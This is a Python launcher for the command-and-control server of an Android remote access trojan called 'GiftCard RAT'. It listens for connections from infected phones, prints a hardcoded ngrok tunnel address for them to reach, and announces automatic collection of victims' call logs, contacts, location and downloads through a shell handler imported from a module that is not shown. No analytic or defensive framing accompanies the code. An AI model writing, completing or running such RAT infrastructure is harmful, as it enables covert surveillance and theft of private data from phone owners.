#!/usr/bin/python
# -*- coding: utf-8 -*-

"""
Fixed GiftCard RAT Server - No Signal Handler Conflicts
"""

import sys
import os
import socket
import time
import argparse

# Add Server directory to path BEFORE importing utils
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'Server'))

# Parse command line arguments
parser = argparse.ArgumentParser(description='GiftCard RAT Server')
parser.add_argument('--port', type=int, default=8888, help='Port to listen on (default: 8888)')
parser.add_argument('--host', type=str, default='0.0.0.0', help='Host to bind to (default: 0.0.0.0, use 127.0.0.1 for localhost only)')
args = parser.parse_args()

PORT = args.port
HOST = args.host

print("🚀 Starting Fixed GiftCard RAT Server...")
print(f"📡 Server will listen on {HOST}:{PORT}")
if PORT == 8888:
    print("🌐 Ngrok URL: 2.tcp.eu.ngrok.io:11134")
print("📱 Ready for Android device connections!")
print("🤖 Automatic commands: call_logs, contacts, location, downloads")
print("=" * 60)

# Import server functions
try:
    from utils import get_shell, banner
    print("✅ Server modules loaded successfully")
except ImportError as e:
    print(f"❌ Failed to import server modules: {e}")
    sys.exit(1)

def main():
    try:
        print(banner)
        print(f"🔄 Starting server on {HOST}:{PORT}...")
        get_shell(HOST, PORT)
    except KeyboardInterrupt:
        print("\n🛑 Server shutdown by user")
    except Exception as e:
        print(f"❌ Server error: {e}")
        print("🔄 Restarting server in 5 seconds...")
        time.sleep(5)
        main()  # Restart on error

if __name__ == "__main__":
    main()